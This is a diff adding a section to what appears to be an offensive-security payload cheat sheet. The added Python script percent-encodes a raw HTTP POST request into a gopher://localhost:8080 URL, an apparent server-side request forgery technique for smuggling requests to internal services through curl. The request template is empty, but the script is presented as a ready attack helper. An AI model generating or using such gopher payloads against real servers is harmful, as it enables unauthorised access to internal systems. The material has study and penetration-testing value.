@@ -4562,3 +4562,25 @@ Connection: close
 - [Mr-Xn](https://github.com/Mr-xn/thinkphp_lang_RCE)
 
 --------------------
+
+### HTTP req with gopher for curl
+
+-------------------
+
+- Script-:
+
+```
+import string
+import requests
+
+raw_post_request = f""""""
+FULL = raw_post_request.encode().hex()
+payload = ""
+for c in range(0,len(FULL),2):
+    ch = chr(int(FULL[c:c+2],16))
+    payload += ch if ch in string.ascii_lowercase+string.ascii_uppercase+string.digits else f"%{FULL[c:c+2]}"
+gopher_url = f"gopher://localhost:8080/_{payload}"
+print(gopher_url)
+```
+
+------------------
